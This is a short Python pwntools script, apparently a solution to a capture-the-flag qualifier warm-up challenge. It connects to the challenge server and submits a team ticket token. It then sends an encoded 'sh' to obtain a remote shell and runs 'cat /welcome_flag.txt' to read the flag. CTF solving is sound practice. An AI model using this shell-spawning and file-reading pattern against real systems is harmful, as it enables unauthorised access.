from pwn import *

io = remote("welcome-to-quals-vfnva65rlchqk.shellweplayaga.me", 10001)
io.sendlineafter(b"please:", b"ticket{OwnershipLease8300n23:A2OkoFKM8o58pkS6dS--6inA6tgGCkXsaAW_mqe1lgJ93btK}")

payload = "sh"
new = ""
for i in payload:
    value = ord(i) + 13
    if value >= 128:
        value -= 26
    new += chr(value)

io.sendlineafter(b"below:", new.encode())
io.sendline(b"cat /welcome_flag.txt")
io.interactive()